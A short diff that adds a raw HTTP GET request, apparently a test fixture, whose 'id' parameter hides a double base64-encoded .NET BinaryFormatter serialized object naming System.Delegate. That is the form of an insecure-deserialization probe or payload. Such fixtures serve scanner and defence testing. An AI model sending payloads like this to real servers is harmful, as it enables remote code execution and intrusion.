@@ -1,0 +1,4 @@
+GET /a?id=QUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFFQVFBQUFCOVRlWE4wWlcwdVJHVnNaV2RoZEdVc1UzbHpkR1Z0TEdVd1BRPT0%3D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
